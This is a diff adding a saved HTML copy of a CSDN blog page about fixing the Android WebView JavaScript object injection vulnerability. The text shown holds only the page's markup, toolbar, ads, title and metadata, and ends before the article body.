@@ -1,0 +1,1364 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<!-- saved from url=(0057)http://blog.csdn.net/leehong2005/article/details/11808557 -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">   
+   
+
+    <script type="text/javascript" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/tracking.js" charset="utf-8"></script>  
+
+    <script type="text/javascript">
+        var protocol = window.location.protocol;
+        document.write('<script type="text/javascript" src="' + protocol + '//csdnimg.cn/pubfooter/js/repoAddr2.js?v=' + Math.random() + '"></' + 'script>');
+    </script><script type="text/javascript" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/repoAddr2.js"></script>
+
+  
+ <meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" media="handheld" href="http://blog.csdn.net/leehong2005/article/details/11808557#">
+
+    <title>Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏
+        - 博客频道 - CSDN.NET</title>
+    
+    <meta name="description" content="Linux tail 命令详解关键字: tail  Linux tail 命令详解用途从指定点开始将文件写到标准输出。使用tail命令的-f选项可以方便的查阅正在改变的日志文件，tail -f filename会把filename里最尾部的内容显示在屏幕上，并且不但刷新，使你看到最新的文件内容。 语法标准语法tail [  -f ] [  -c Number |  -n Num">
+    <script src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/jquery.js" type="text/javascript"></script>
+      <script type="text/javascript" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/jquery-version.js"></script>
+    <script type="text/javascript" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/ad.js"></script>
+        <!--new top-->
+       
+        <link rel="stylesheet" href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/index.css">
+        <!--new top-->
+    
+      <!-- ad begin -->
+         <script language="javascript" type="text/javascript" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/tracking(1).js"></script>
+    <!-- ad end-->
+
+    <link rel="Stylesheet" type="text/css" href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/style.css">
+    <link id="RSSLink" title="RSS" type="application/rss+xml" rel="alternate" href="http://blog.csdn.net/leehong2005/rss/list">
+    <link rel="shortcut icon" href="http://c.csdnimg.cn/public/favicon.ico">
+    <link type="text/css" rel="stylesheet" href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/default.css">
+ 
+
+
+<script src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/share.js"></script><link rel="stylesheet" type="text/css" href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/job_reco.css"><style type="text/css">.MathJax_Hover_Frame {border-radius: .25em; -webkit-border-radius: .25em; -moz-border-radius: .25em; -khtml-border-radius: .25em; box-shadow: 0px 0px 15px #83A; -webkit-box-shadow: 0px 0px 15px #83A; -moz-box-shadow: 0px 0px 15px #83A; -khtml-box-shadow: 0px 0px 15px #83A; border: 1px solid #A6D ! important; display: inline-block; position: absolute}
+.MathJax_Hover_Arrow {position: absolute; width: 15px; height: 11px; cursor: pointer}
+</style><style type="text/css">#MathJax_About {position: fixed; left: 50%; width: auto; text-align: center; border: 3px outset; padding: 1em 2em; background-color: #DDDDDD; color: black; cursor: default; font-family: message-box; font-size: 120%; font-style: normal; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; border-radius: 15px; -webkit-border-radius: 15px; -moz-border-radius: 15px; -khtml-border-radius: 15px; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+.MathJax_Menu {position: absolute; background-color: white; color: black; width: auto; padding: 2px; border: 1px solid #CCCCCC; margin: 0; cursor: default; font: menu; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; z-index: 201; box-shadow: 0px 10px 20px #808080; -webkit-box-shadow: 0px 10px 20px #808080; -moz-box-shadow: 0px 10px 20px #808080; -khtml-box-shadow: 0px 10px 20px #808080; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+.MathJax_MenuItem {padding: 2px 2em; background: transparent}
+.MathJax_MenuArrow {position: absolute; right: .5em; color: #666666}
+.MathJax_MenuActive .MathJax_MenuArrow {color: white}
+.MathJax_MenuArrow.RTL {left: .5em; right: auto}
+.MathJax_MenuCheck {position: absolute; left: .7em}
+.MathJax_MenuCheck.RTL {right: .7em; left: auto}
+.MathJax_MenuRadioCheck {position: absolute; left: 1em}
+.MathJax_MenuRadioCheck.RTL {right: 1em; left: auto}
+.MathJax_MenuLabel {padding: 2px 2em 4px 1.33em; font-style: italic}
+.MathJax_MenuRule {border-top: 1px solid #CCCCCC; margin: 4px 1px 0px}
+.MathJax_MenuDisabled {color: GrayText}
+.MathJax_MenuActive {background-color: Highlight; color: HighlightText}
+.MathJax_Menu_Close {position: absolute; width: 31px; height: 31px; top: -15px; left: -15px}
+</style><style type="text/css">#MathJax_Zoom {position: absolute; background-color: #F0F0F0; overflow: auto; display: block; z-index: 301; padding: .5em; border: 1px solid black; margin: 0; font-weight: normal; font-style: normal; text-align: left; text-indent: 0; text-transform: none; line-height: normal; letter-spacing: normal; word-spacing: normal; word-wrap: normal; white-space: nowrap; float: none; box-shadow: 5px 5px 15px #AAAAAA; -webkit-box-shadow: 5px 5px 15px #AAAAAA; -moz-box-shadow: 5px 5px 15px #AAAAAA; -khtml-box-shadow: 5px 5px 15px #AAAAAA; filter: progid:DXImageTransform.Microsoft.dropshadow(OffX=2, OffY=2, Color='gray', Positive='true')}
+#MathJax_ZoomOverlay {position: absolute; left: 0; top: 0; z-index: 300; display: inline-block; width: 100%; height: 100%; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+#MathJax_ZoomFrame {position: relative; display: inline-block; height: 0; width: 0}
+#MathJax_ZoomEventTrap {position: absolute; left: 0; top: 0; z-index: 302; display: inline-block; border: 0; padding: 0; margin: 0; background-color: white; opacity: 0; filter: alpha(opacity=0)}
+</style><style type="text/css">.MathJax_Preview {color: #888}
+#MathJax_Message {position: fixed; left: 1em; bottom: 1.5em; background-color: #E6E6E6; border: 1px solid #959595; margin: 0px; padding: 2px 8px; z-index: 102; color: black; font-size: 80%; width: auto; white-space: nowrap}
+#MathJax_MSIE_Frame {position: absolute; top: 0; left: 0; width: 0px; z-index: 101; border: 0px; margin: 0px; padding: 0px}
+.MathJax_Error {color: #CC0000; font-style: italic}
+</style><link rel="stylesheet" type="text/css" href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/style(1).css"><link type="text/css" rel="stylesheet" href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/style(2).css"><script src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/get_ads.php" type="text/javascript"></script><script src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/logger.js"></script><link href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/bdsstyle.css" rel="stylesheet" type="text/css"><link rel="stylesheet" href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/share_style0_16.css"></head>
+<body><div id="BAIDU_DUP_fp_wrapper" style="position: absolute; left: -1px; bottom: -1px; z-index: 0; width: 0px; height: 0px; overflow: hidden; visibility: hidden; display: none;"><iframe id="BAIDU_DUP_fp_iframe" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/o.html" style="width: 0px; height: 0px; visibility: hidden; display: none;"></iframe></div><iframe frameborder="0" style="display: none;" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/saved_resource.html"></iframe><div id="MathJax_Message" style="display: none;"></div>
+    <!-- 广告位开始 -->
+        <div class="J_adv" data-view="true" data-mod="ad_popu_149" data-mtp="30" data-order="207" data-con="ad_content_586"><script id="popuLayer_js_q_a" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/popuLayer.js" defer="" async="" type="text/javascript"></script><div id="fulln1pze" style="text-align: center; width: 1170px; overflow: hidden; margin: 0px auto; display: block; height: 0px;"><a href="http://msdn.csdn.net/" target="_blank"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/201605171015439276.jpg"></a></div><script>  document.getElementById('popuLayer_js_q_a').onload=function(){      window.CSDN.Layer.FullAdv('#fulln1pze',{storageName:'fulln1pze',total:-1});  }</script></div>
+    <!-- 广告位结束 -->
+
+    
+   
+      <!--new top-->
+    <script id="toolbar-tpl-scriptId" fixed="true" prod="blog" skin="black" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/html.js" type="text/javascript"></script><div class="csdn-toolbar csdn-toolbar-skin-black ">        <div class="container row center-block ">          <div class="col-md-3 pull-left logo clearfix"><a href="http://www.csdn.net/?ref=toolbar" title="CSDN首页" target="_blank" class="icon"></a><a title="频道首页" href="http://blog.csdn.net/?ref=toolbar_logo" class="img blog-icon"></a></div>          <div class="pull-right login-wrap unlogin">            <ul class="btns">              <li class="loginlink"><a href="https://passport.csdn.net/account/login?ref=toolbar" target="_top">登录&nbsp;</a>|<a target="_top" href="http://passport.csdn.net/account/mobileregister?ref=toolbar&amp;action=mobileRegister">&nbsp;注册</a></li>              <li class="search">                <div class="icon on-search-icon">                  <div class="wrap">                    <div class="curr-icon-wrap">                      <div class="curr-icon"></div>                    </div>                    <form action="http://so.csdn.net/search" method="get" target="_blank">                      <input type="hidden" value="toolbar" name="ref" accesskey="2">                      <div class="border">                        <input placeholder="搜索" type="text" value="" name="q" accesskey="2"><span class="icon-enter-sm"></span>                      </div>                    </form>                  </div>                </div>              </li>              <li class="favor">                <div class="icon on-favor-icon">                  <div class="wrap">                    <div class="curr-icon-wrap">                      <div class="curr-icon"></div>                    </div>                    <div style="display:none;" class="favor-success"><span class="msg">收藏成功</span>                      <div class="btns"><span class="btn btn-primary ok">确定</span></div>                    </div>                    <div style="display:none;" class="favor-failed"><span class="icon-danger-lg"></span><span class="msg">收藏失败，请重新收藏</span>                      <div class="btns"><span class="btn btn-primary ok">确定</span></div>                    </div>                    <form role="form" class="form-horizontal favor-form">                      <div class="form-group">                        <div class="clearfix">                          <label for="input-title" class="col-sm-2 control-label">标题</label>                          <div class="col-sm-10">                            <input id="inputTitle" type="text" placeholder="" class="title form-control">                          </div>                        </div>                        <div class="alert alert-danger"><strong></strong>标题不能为空</div>                      </div>                      <div class="form-group">                        <label for="input-url" class="col-sm-2 control-label">网址</label>                        <div class="col-sm-10">                          <input id="input-url" type="text" placeholder="" class="url form-control">                        </div>                      </div>                      <div class="form-group">                        <label for="input-tag" class="col-sm-2 tag control-label">标签</label>                        <div class="col-sm-10">                          <input id="input-tag" type="text" class="form-control tag">                        </div>                      </div>                      <div class="form-group">                        <label for="input-description" class="description col-sm-2 control-label">摘要</label>                        <div class="col-sm-10">                          <textarea id="input-description" class="form-control description"></textarea>                        </div>                      </div>                      <div class="form-group">                        <div class="col-sm-offset-2 col-sm-10 ft">                          <div class="col-sm-4 pull-left">                            <div class="checkbox">                              <label>                                <input type="checkbox" name="share" checked="checked" class="share">公开                              </label>                            </div>                          </div>                          <div class="col-sm-8 pull-right favor-btns">                            <button type="button" class="cancel btn btn-default">取消</button>                            <button type="submit" class="submit btn btn-primary">收藏</button>                          </div>                        </div>                      </div>                    </form>                  </div>                </div>              </li>              <li class="notify">                <div style="display:none" class="number"></div>                <div style="display:none" class="icon-hasnotes-sm"></div>                <div id="header_notice_num"></div>                <div class="icon on-notify-icon">                  <div class="wrap">                    <div class="curr-icon-wrap">                      <div class="curr-icon"></div>                    </div>                    <div id="note1" class="csdn_note">                      <div class="box"></div>                    <iframe src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/saved_resource(1).html" frameborder="0" allowtransparency="true" style="z-index:-1;position:absolute;top:0;left:0;width:100%;height:100%;background:transparent"></iframe></div>                  </div>                </div>              </li>              <li class="ugc">                <div class="icon on-ugc-icon">                  <div class="wrap clearfix">                    <div class="curr-icon-wrap">                      <div class="curr-icon"></div>                    </div>                    <dl>                      <dt><a href="http://geek.csdn.net/news/expert?ref=toolbar" target="_blank" class="p-news clearfix" style="display:none;"><em class="icon"></em><span>分享资讯</span></a></dt>                      <dt style="border: none;"><a href="http://u.download.csdn.net/upload?ref=toolbar" target="_blank" class="p-doc clearfix"><em class="icon"></em><span>传PPT/文档</span></a></dt>                      <dt><a href="http://bbs.csdn.net/topics/new?ref=toolbar" target="_blank" class="p-ask clearfix"><em class="icon"></em><span>提问题</span></a></dt>                      <dt><a href="http://write.blog.csdn.net/postedit?ref=toolbar" target="_blank" class="p-blog clearfix"><em class="icon"></em><span>写博客</span></a></dt>                      <dt><a href="http://u.download.csdn.net/upload?ref=toolbar" target="_blank" class="p-src clearfix"><em class="icon"></em><span>传资源</span></a></dt>                      <dt><a href="https://code.csdn.net/projects/new?ref=toolbar" target="_blank" class="c-obj clearfix"><em class="icon"></em><span>创建项目</span></a></dt>                      <dt><a href="https://code.csdn.net/snippets/new?ref=toolbar" target="_blank" class="c-code clearfix"><em class="icon"></em><span>创建代码片</span></a></dt>                    </dl>                  </div>                </div>              </li>              <li class="profile">                <div class="icon on-profile-icon"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/100x100.jpg" class="curr-icon-img">                  <div class="wrap clearfix">                    <div class="curr-icon-wrap">                      <div class="curr-icon"></div>                    </div>                    <div class="bd">                      <dl class="clearfix">                        <dt class="pull-left img"><a target="_blank" href="http://my.csdn.net/?ref=toolbar" class="avatar"><img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/100x100.jpg"></a></dt>                        <dd class="info" style="border: none;"><a target="_blank" href="http://my.csdn.net/?ref=toolbar" class="nickname"></a><a class="set-nick" href="https://passport.csdn.net/account/profile">设置昵称<span class="write-icon"></span></a><span class="dec"><a class="fill-dec" href="http://my.csdn.net/" target="_blank">编辑自我介绍，让更多人了解你<span class="write-icon"></span></a></span></dd>                      </dl>                    </div>                    <div class="ft clearfix"><a target="_blank" href="http://my.csdn.net/my/account/changepwd?ref=toolbar" class="pull-left"><span class="icon-cog"></span>帐号设置</a><a href="https://passport.csdn.net/account/logout?ref=toolbar" target="_top" class="pull-left" style="margin-left:132px; width:18px; height:27px; white-space:nowrap; overflow:hidden;"><span class="icon-signout"></span><span class="out">退出</span></a></div>                  </div>                </div>              </li>              <li class="apps">                <div id="chasnew123" class="hasnew" style="display: none;"></div>                <div id="cappsarea123" class="icon on-apps-icon">                  <div class="wrap clearfix">                    <div class="curr-icon-wrap">                      <div class="curr-icon"></div>                    </div>                  <div class="detail">                    <dl>                      <dt>                        <h5>社区</h5>                      </dt>                      <dd> <a href="http://blog.csdn.net/?ref=toolbar" target="_blank">博客</a></dd>                      <dd> <a href="http://bbs.csdn.net/?ref=toolbar" target="_blank">论坛</a></dd>                      <dd> <a href="http://download.csdn.net/?ref=toolbar" target="_blank">下载</a></dd>                      <dd> <a href="http://lib.csdn.net/?ref=toolbar" target="_blank">知识库</a></dd>                      <dd><a href="http://ask.csdn.net/?ref=toolbar" target="_blank">技术问答</a></dd>                      <dd><a href="http://geek.csdn.net/?ref=toolbar" target="_blank">极客头条</a></dd>                      <dd style="display:none"> <a href="http://hero.csdn.net/?ref=toolbar" target="_blank">英雄会</a></dd>                    </dl>                  </div>                  <div class="detail">                    <dl>                      <dt>                        <h5>服务</h5>                      </dt>                      <dd style="display:none"> <a href="http://job.csdn.net/?ref=toolbar" target="_blank">JOB<img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/new.gif" style="display: none; margin-top: -26px; width: 23px;"></a></dd>                      <dd> <a href="http://edu.csdn.net/?ref=toolbar" target="_blank">学院<img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/new.gif" style="display: none; margin-top: -26px; width: 23px;"></a></dd>                      <dd> <a href="https://code.csdn.net/?ref=toolbar" target="_blank">CODE</a></dd>                      <dd> <a href="http://huiyi.csdn.net/?ref=toolbar" target="_blank">活动</a></dd>                      <dd> <a href="http://www.csto.com/?ref=toolbar" target="_blank">CSTO</a></dd>                      <dd> <a href="http://mall.csdn.net/?ref=toolbar" target="_blank">C币兑换<img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/new.gif" style="display: none; margin-top: -26px; width: 23px;"></a></dd>                    </dl>                  </div>                  <div class="detail last">                    <dl>                      <dt>                        <h5>俱乐部</h5>                      </dt>                      <dd> <a href="http://cto.csdn.net/?ref=toolbar" target="_blank">CTO俱乐部</a></dd>                      <dd> <a href="http://student.csdn.net/?ref=toolbar" target="_blank">高校俱乐部</a></dd>                    </dl>                  </div>                </div>              </div>            </li>            </ul>          </div>        </div>    </div>
+     <!--new top-->
+    <div id="container">
+        <div id="header">
+    <div class="header">
+        <div id="blog_title">
+            <h2>
+                <a href="http://blog.csdn.net/leehong2005">永远即等待的专栏</a></h2>
+            <h3>记录自己的点点滴滴</h3>
+            <div class="clear">
+            </div>
+        </div>
+        <div class="clear">
+        </div>
+        
+    </div>
+</div>
+<div id="navigator">
+    <div class="navigator_bg">
+    </div>
+    <div class="navigator">
+        <ul>
+            
+                <li id="btnContents"><a href="http://blog.csdn.net/leehong2005?viewmode=contents"><span onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_mulu&#39;])">
+                    <img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/ico_list.gif">目录视图</span></a></li>
+                <li id="btnView"><a href="http://blog.csdn.net/leehong2005?viewmode=list"><span onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_zhaiyao&#39;])">
+                    <img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/ico_summary.gif">摘要视图</span></a></li>
+                <li id="btnRss"><a href="http://blog.csdn.net/leehong2005/rss/list"><span onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_RSS&#39;])">
+                    <img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/ico_rss.gif">订阅</span></a></li>                
+            
+
+            </ul>
+    </div>
+</div>
+<script type="text/javascript">
+    var username = "leehong2005";
+    var _blogger = username;
+    var blog_address = "http://blog.csdn.net/leehong2005";
+    var static_host = "http://static.blog.csdn.net";
+    var currentUserName = "";  
+</script>
+
+        <div id="body">
+            <div id="main">
+                <div class="main">
+                        <div class="ad_class">
+<div class="notice tracking-ad" data-mod="popu_3"> 
+
+
+<a href="http://blog.csdn.net/blogdevteam/article/details/51919935" target="_blank">
+<font color="blue">【公告】博客系统优化升级</font></a>
+&nbsp;&nbsp;&nbsp;
+<a href="http://lib.csdn.net/base/scala" target="_blank">
+<font color="red">【收藏】Scala 资源一应俱全
+</font></a>
+&nbsp;&nbsp;&nbsp;
+<a href="http://blog.csdn.net/blogdevteam/article/details/51984275" target="_blank">
+<font color="blue">博乐招募开始啦
+</font></a>
+&nbsp;&nbsp;&nbsp;
+
+<a href="http://geek.csdn.net/news/detail/94222" target="_blank">
+<font color="red">程序员七夕表白礼品指南
+</font></a>
+&nbsp;&nbsp;&nbsp;
+
+
+</div>                        </div>
+                        
+
+
+
+<!-- 广告位开始 -->
+<div class="J_adv" data-view="true" data-mod="ad_popu_72" data-mtp="40" data-order="40" data-con="ad_content_217" style="width: 1px; height: 1px; position: fixed; right: 10px; bottom: 10px; z-index: 999; background-color: transparent;"><div id="location_parent"></div><script>document.getElementById('location_parent').parentNode.style.height='1px';document.getElementById('location_parent').parentNode.style.width='1px';document.getElementById('location_parent').parentNode.style.position='fixed';document.getElementById('location_parent').parentNode.style.right='10px';document.getElementById('location_parent').parentNode.style.bottom='10px';document.getElementById('location_parent').parentNode.style.zIndex=999;document.getElementById('location_parent').parentNode.style.backgroundColor='transparent';</script><!-- 广告占位容器 --><div id="cpro_u2392861" style="box-sizing: content-box; width: 311px; height: 286px; overflow: hidden; z-index: 2147483647; position: fixed; bottom: 10px; right: 130px;"><div style="box-sizing: content-box;width:300px;height:250px;padding:4px;border:#acacac 1px solid;overflow:hidden;position:absolute;left:0;top:25px;"><iframe id="cpro_u2392861_iframe" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/ocwm.html" width="300" height="250" align="center,center" vspace="0" hspace="0" marginwidth="0" marginheight="0" scrolling="no" frameborder="0" style="border:0; vertical-align:bottom;margin:0;" allowtransparency="true"></iframe></div><div id="cpro_u2392861_closebtn" style="box-sizing: content-box;position:absolute;width:61px;height:20px;top:0;left:250px;margin:0;padding:0;margin-bottom:5px;cursor:pointer;overflow:hidden;"><div style="box-sizing: content-box;width:40px;height:20px;background-color:#999999;color:#fff;float:left;margin-right:1px;font-size:12px;font-family:微软雅黑;text-align: center;line-height:20px;">关闭</div><a style="maring:0;padding:0;display:inline-block;border:none;overflow:hidden;height:20px;line-height:20px;cursor:pointer;width:20px;background:url(&#39;//cpro.baidustatic.com/cpro/ui/noexpire/img/2.0.1/xuanfu_close.png&#39;) no-repeat 0 0;margin-bottom:3px;float:left"></a></div></div><!-- 投放代码 --><script type="text/javascript">(window['cproStyleApi'] = window['cproStyleApi'] || {})['u2392861']={at:'3',rsi0:'300',rsi1:'250',pat:'17',tn:'baiduCustNativeAD_xuanfu',rss1:'#FFFFFF',conBW:'1',adp:'1',ptt:'0',titFF:'%E5%BE%AE%E8%BD%AF%E9%9B%85%E9%BB%91',titFS:'14',rss2:'#000000',titSU:'0'};/*服务器频道首页置顶Banner960*90，创建于2014-7-3*/(window.cproArray = window.cproArray || []).push({id:'u2392861'});  </script>  <script src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/f.js" type="text/javascript"></script></div>
+<!-- 广告位结束 -->
+
+  
+<link href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/comment1.css" type="text/css" rel="stylesheet">
+<link href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/style1.css" type="text/css" rel="stylesheet">
+<script language="JavaScript" type="text/javascript" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/jquery.cookie.js"></script>
+<script type="text/javascript" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/main.js"></script>
+<link rel="stylesheet" href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/markdown_views.css">
+<link rel="stylesheet" href="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/category.css">
+<script type="text/javascript" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/MathJax.js"></script>
+<script type="text/javascript" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/web-storage-cache.min.js"></script>
+<script type="text/javascript" src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/replace.min.js"></script>
+
+
+
+
+  <script type="text/ecmascript">
+      window.quickReplyflag = true;
+           
+            var isBole = false;
+            
+          
+    </script>
+<div id="article_details" class="details">
+    <div class="article_title">   
+         <span class="ico ico_type_Original"></span>
+
+
+    <h1>
+        <span class="link_title"><a href="http://blog.csdn.net/leehong2005/article/details/11808557">
+        <font color="red">[置顶]</font>
+        Android WebView的Js对象注入漏洞解决方案            
+        </a></span>
+    </h1>
+</div>
+
+   
+
+        <div class="article_manage clearfix">
+        <div class="article_l">
+            <span class="link_categories">
+            标签：
+              <a href="http://www.csdn.net/tag/webview" target="_blank" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_tag&#39;]);">webview</a><a href="http://www.csdn.net/tag/js" target="_blank" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_tag&#39;]);">js</a><a href="http://www.csdn.net/tag/android" target="_blank" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_tag&#39;]);">android</a><a href="http://www.csdn.net/tag/%e5%ae%89%e5%85%a8%e6%bc%8f%e6%b4%9e" target="_blank" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_tag&#39;]);">安全漏洞</a>
+            </span>
+        </div>
+        <div class="article_r">
+            <span class="link_postdate">2013-09-30 11:01</span>
+            <span class="link_view" title="阅读次数">42310人阅读</span>
+            <span class="link_comments" title="评论次数"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#comments" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_pinglun&#39;])">评论</a>(31)</span>
+            <span class="link_collect tracking-ad" data-mod="popu_171"> <a href="javascript:void(0);" onclick="javascript:collectArticle(&#39;Android WebView的Js对象注入漏洞解决方案&#39;,&#39;11808557&#39;);return false;" title="收藏" target="_blank">收藏</a></span>
+             <span class="link_report"> <a href="http://blog.csdn.net/leehong2005/article/details/11808557#report" onclick="javascript:report(11808557,2);return false;" title="举报">举报</a></span>
+
+        </div>
+    </div>
+    <div class="embody" style="" id="embody">
+        <span class="embody_t">本文章已收录于：</span>
+        <div class="embody_c" id="lib" value="{&quot;err&quot;:0,&quot;msg&quot;:&quot;ok&quot;,&quot;data&quot;:[{&quot;name&quot;:&quot;Android知识库&quot;,&quot;url&quot;:&quot;http://lib.csdn.net/base/15?source=blogtop&quot;,&quot;logo&quot;:&quot;http://img.knowledge.csdn.net/upload/base/1455589744328_328.jpg&quot;}]}"> <a href="http://lib.csdn.net/base/15?source=blogtop" target="_blank"> <img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/1455589744328_328.jpg"> <em><b>Android知识库</b></em> </a></div>
+    </div>
+    <style type="text/css">        
+            .embody{
+                padding:10px 10px 10px;
+                margin:0 -20px;
+                border-bottom:solid 1px #ededed;                
+            }
+            .embody_b{
+                margin:0 ;
+                padding:10px 0;
+            }
+            .embody .embody_t,.embody .embody_c{
+                display: inline-block;
+                margin-right:10px;
+            }
+            .embody_t{
+                font-size: 12px;
+                color:#999;
+            }
+            .embody_c{
+                font-size: 12px;
+            }
+            .embody_c img,.embody_c em{
+                display: inline-block;
+                vertical-align: middle;               
+            }
+             .embody_c img{               
+                width:30px;
+                height:30px;
+            }
+            .embody_c em{
+                margin: 0 20px 0 10px;
+                color:#333;
+                font-style: normal;
+            }
+    </style>
+    <script type="text/javascript">
+        $(function () {
+            try
+            {
+                var lib = eval("("+$("#lib").attr("value")+")");
+                var html = "";
+                if (lib.err == 0) {
+                    $.each(lib.data, function (i) {
+                        var obj = lib.data[i];
+                        //html += '<img src="' + obj.logo + '"/>' + obj.name + "&nbsp;&nbsp;";
+                        html += ' <a href="' + obj.url + '" target="_blank">';
+                        html += ' <img src="' + obj.logo + '">';
+                        html += ' <em><b>' + obj.name + '</b></em>';
+                        html += ' </a>';
+                    });
+                    if (html != "") {
+                        setTimeout(function () {
+                            $("#lib").html(html);                      
+                            $("#embody").show();
+                        }, 100);
+                    }
+                }      
+            } catch (err)
+            { }
+            
+        });
+    </script>
+      <div class="category clearfix">
+        <div class="category_l">
+           <img src="./Android WebView的Js对象注入漏洞解决方案 - 永远即等待的专栏 - 博客频道 - CSDN.NET_files/category_icon.jpg">
+            <span>分类：</span>
+        </div>
+        <div class="category_r">
+                    <label onclick="GetCategoryArticles(&#39;1086396&#39;,&#39;leehong2005&#39;,&#39;top&#39;,&#39;11808557&#39;);">
+                        <span onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_fenlei&#39;]);">Android<em>（44）</em></span>
